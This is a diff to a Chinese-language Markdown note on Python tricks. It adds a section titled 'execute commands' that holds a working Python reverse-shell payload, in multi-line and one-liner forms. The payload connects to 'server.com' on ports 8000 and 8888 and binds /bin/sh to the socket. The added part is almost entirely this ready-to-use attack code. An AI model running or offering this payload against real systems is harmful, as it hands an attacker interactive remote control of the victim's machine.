@@ -267,6 +267,22 @@ TypeError: unbound method __func() must be called with test instance as first ar
 #不实例化，直接访问
 ```
 
+### 0x7、执行命令
+
+```
+#执行反弹shell的命令
+
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("server.com",8000));
+os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+
+#一句话格式
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("server.com",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+```
 
 **参考：**
 
